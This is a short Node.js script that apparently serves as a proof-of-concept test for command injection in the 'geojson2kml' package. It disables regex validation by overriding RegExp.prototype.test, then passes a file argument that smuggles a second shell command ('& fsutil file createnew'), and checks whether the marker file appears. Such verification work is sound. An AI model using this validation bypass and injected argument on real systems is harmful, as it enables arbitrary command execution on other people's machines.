RegExp.prototype.test = () => false;
const a = require('geojson2kml');
const fs = require('fs');
const path = './geojson2kml';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
a('./', 'nul & fsutil file createnew geojson2kml 0', function (err) {
    if (err)
        throw err;
    else {
        file_exist = fs.existsSync(path);
        console.log('{ ' + file_exist + ', ' + true + ' }');
        fs.unlink(path, function (err) {
        });
    }
});